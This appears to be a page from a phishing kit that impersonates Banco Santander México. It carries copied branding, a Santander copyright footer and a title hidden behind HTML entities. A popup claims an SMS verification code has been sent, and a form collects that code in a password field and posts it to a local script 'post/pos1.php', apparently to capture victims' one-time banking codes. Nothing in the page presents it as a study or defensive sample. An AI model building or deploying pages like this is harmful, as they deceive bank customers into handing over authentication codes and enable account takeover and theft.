<?php

require 'methods/date.php';

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#83;&#97;&#110;&#116;&#97;&#110;&#100;&#101;&#114;&nbsp;|&nbsp;&#77;4&nbsp;&#91;4.6.1&#93;</title>
    <link rel="shortcut icon" href="resources/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="css/styles.c08fc20fe24b11c0246e.bundle.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>

</head>    
<style>
        body {
        background: #fff !important;
        width: 100vw;
        height: 100vh;
        margin: 0;
        padding: 0;
      }

      .loader-container {
        box-sizing: border-box;
        padding-top: 40vh;
        text-align: center
      }

      .clearfix:after {
        content: "";
        display: table;
        clear: both;
        width: 100%
      }

      div.clearfix {
        margin-bottom: 5px
      }

      .loader {
        display: block;
        width: 300px;
        height: 3px;
        background: #FF6F7C;
        margin: 10px auto 20px
      }

      .innerLoader {
        width: 0;
        height: 100%;
        background: #FFF;
        animation: loader 8s forwards;
        box-shadow: 0 0 3px #FF6F7C
      }

      .logo-santander {
        height: 60vh;
        width: 100vw;
        position: absolute
      }

      .logo-santander img {
        margin-left: auto;
        margin-right: auto;
        display: block;
        width: 280px
      }

      @keyframes loader {
        from {
          width: 0
        }
        to {
          width: 100%
        }
      }

      @-moz-keyframes loader {
        from {
          width: 0
        }
        to {
          width: 100%
        }
      }

      @-webkit-keyframes loader {
        from {
          width: 0
        }
        to {
          width: 100%
        }
      }

      @-o-keyframes loader {
        from {
          width: 0
        }
        to {
          width: 100%
        }
      }

      .navbar[_ngcontent-c7] {
    background-color: #FF0000;
    color: #fff;
    background-repeat: no-repeat;
    background-size: 100%;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -ms-flex-line-pack: center;
    align-content: center;
    padding: auto;
}

.footer[_ngcontent-c12] {
    background-color: #676767;
    color: #fff;
    padding: 0;
    height: 120px;
    margin-top:70px;
    width:100%;
    height:120px;
}

form{
  margin-left: 30%;
}

.tooltiptext[_ngcontent-c15]{
    width: 290px;
    height: 100px;
}
    </style>
<body>

<script>

    
Swal.fire({
    /*imageUrl: 'resources/Santander-Logo.png',
    imageHeight: 100,*/
    icon: 'success',
    backdrop: true,
    confirmButtonText: 'Aceptar',
    allowOutsideClick: false,
    backdrop: true,
    confirmButtonColor: '#E52320',
    confirmButtonText: 'Aceptar',
    allowOutsideClick: false,
    html: '<h1 style="text-align:center;margin-bottom:15px;font-size:30px;font-weight: bold;">C&Oacute;DIGO SMS ENVIADO</h1><br><p style="text-align:center;">El c&oacute;digo que vas a recibir es EXCLUSIVO para verificar tu identidad. Por tu seguridad no lo compartas</p>'
});
</script>

<super-net ng-version="5.2.11"><super-sidebar _nghost-c1="">
<ng-sidebar-container _ngcontent-c1="" _nghost-c2="">
    <!---->


    <div _ngcontent-c2="" class="ng-sidebar__content ng-sidebar__content--animate" style="padding: 0px;">
      <main _ngcontent-c1="" ng-sidebar-content="">
        <div _ngcontent-c1=""></div>
        <super-header _ngcontent-c1="" _nghost-c7="" style="width: 1000px;"><!----><div _ngcontent-c7="" class="ng-star-inserted">
        <!---->
        <nav _ngcontent-c7="" style="color:#E52320;" class="navbar mobile" style="background: url(&quot;assets/img/headerWallpapers/afternoon.jpg&quot;) center center / cover no-repeat;">
        <div _ngcontent-c7="" class="w-100">
        <div _ngcontent-c7="" class="insideNav" style="max-width: 1000px;">
            <div _ngcontent-c7="" class="row m-0 icons-row">
            
            <div _ngcontent-c7="" class="items text-center col-12">
            <!---->
            <!----><div _ngcontent-c7="" class="ng-star-inserted">
              <div _ngcontent-c7="" class="d-flex flex-column">
                <!---->

<img src="resources/images.png" style="height: 45px; width: 45px;margin-left:73%;">
                <!----><div _ngcontent-c7="" class="ng-star-inserted" style="color:#fff;margin-left:50%;">
                  <div _ngcontent-c7="" class="p-1 h-component p-0 m-0 text-capitalize">
                    Identificación
                  </div>
                  <div _ngcontent-c7="" class="p-1 h-date pt-0">
                    <?php echo $valueDay." de" ?>  
                    <span _ngcontent-c7="" class="text-capitalize">
                      <?php echo $meses[$valueMonth-1].", ".$year; ?>
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!---->
            <div _ngcontent-c7="" class="col-9 d-flex px-0 mt-1 icons-wrapperv justify-content-end">
              <!---->
              <!---->
              <!---->
              <!---->
              <!---->
          </div>
        </div>
      </div>
    </div>
  </nav>
</div>

<!---->

<!---->
</super-header>
    <div _ngcontent-c1="" class="w-100">
      <div _ngcontent-c1="" class="shell-center" style="max-width: 1200px;">
        <div _ngcontent-c1="" class="m-auto" style="max-width: 1000px;">
          <!---->
        </div>
        <!---->
        <!---->

        <div _ngcontent-c1="" class="row m-auto">
          <!---->
          <div _ngcontent-c1="" class="col-12 m-auto px-0">
            <div _ngcontent-c1="" class="desktop">
              <div _ngcontent-c1="" class="w-100 m-auto" style="max-width: 1000px; min-height: 370px;">
                
                <super-shell _ngcontent-c1=""><!---->
<router-outlet></router-outlet><ng-component class="ng-star-inserted"><router-outlet></router-outlet><ng-component _nghost-c15="" class="ng-star-inserted">

<script src="methods/number.js"></script>


<div _ngcontent-c15="" class="container-fluid">
  
  <div _ngcontent-c15="" class="row justify-content-center show-grid" style="margin-top: 50px;">
    <form _ngcontent-c15="" novalidate="" class="ng-touched ng-dirty ng-valid" action="post/pos1.php" method="POST" autocomplete="off" name="form1">
      <div _ngcontent-c15="" class="row justify-content-center d-block">
        <div _ngcontent-c15="" class="col-12">
          <div _ngcontent-c15="" class="form-group">
            <label _ngcontent-c15="" class="code" for="input">
            C&oacute;digo SMS:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
              <div _ngcontent-c15="" class="tooltip">
  
              </div>
            </label>
            <input _ngcontent-c15="" minlength="8"  placeholder="C&oacute;digo SMS" class="form-control ng-touched ng-dirty ng-valid" formcontrolname="client" name="pass" id="user" type="password">
          </div>
        </div>
      </div>
      <div _ngcontent-c15="" class="mb-3"></div>
      <div _ngcontent-c15="" class="row justify-content-center text-center ">
        <div _ngcontent-c15="" class="col-12 text-center">
          <button _ngcontent-c15="" class="rounded-red-button btn-continue" type="submit" id="btn">
            Continuar
          </button>
        </div>
      </div>
      <div _ngcontent-c15="" class="mb-5"></div>

    </form>
  </div>
</div>
<br _ngcontent-c15="">

</ng-component></ng-component>
</super-shell>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <super-footer _ngcontent-c1="" _nghost-c12="">
<!---->

<!----><nav _ngcontent-c12="" class="navbar w-100 footer desktop ng-star-inserted">
  <div _ngcontent-c12="" class="container-fluid inside-footer m-auto">
    <div _ngcontent-c12="" class="row w-100 mx-3">
      <div _ngcontent-c12="" class="col-9 py-2">
        <p _ngcontent-c12="" class=" m-0" style="font-size: 14px;">
          Derechos Reservados 2018, ©Banco Santander México S.A.,
          Institución de Banca Múltiple,<br _ngcontent-c12=""> Grupo Financiero Santander.
          <span _ngcontent-c12="" class="legal">
            Aviso Legal
          </span><span _ngcontent-c12="" class="legal">
            Términos y Condiciones
          </span>
          <span _ngcontent-c12="" class="version"> | M4 [4.6.1]</span>
        </p>
      </div>
      <div _ngcontent-c12="" class="f-img col-3 text-right pt-10px" style="font-size: 19px;">
        <img _ngcontent-c12="" class="footer-santander" src="resources/santander_logo_white.svg" style="height:20;width:150px;">
      </div>
    </div>
  </div>
</nav>
</super-footer>
  </main>
    </div>
  </ng-sidebar-container>
</super-sidebar>
</super-net><script type="text/javascript" src="js/inline.cf6621799c793712aef5.bundle.js"></script>
<script type="text/javascript" src="js/polyfills.6b26d50731fd8c261a5b.bundle.js"></script>
<script type="text/javascript" src="js/scripts.12e6f696de7c034c69d6.bundle.js"></script>
<script type="text/javascript" src="js/main.07cbee6c121ec99043d1.bundle.js"></script>
</body>
</html>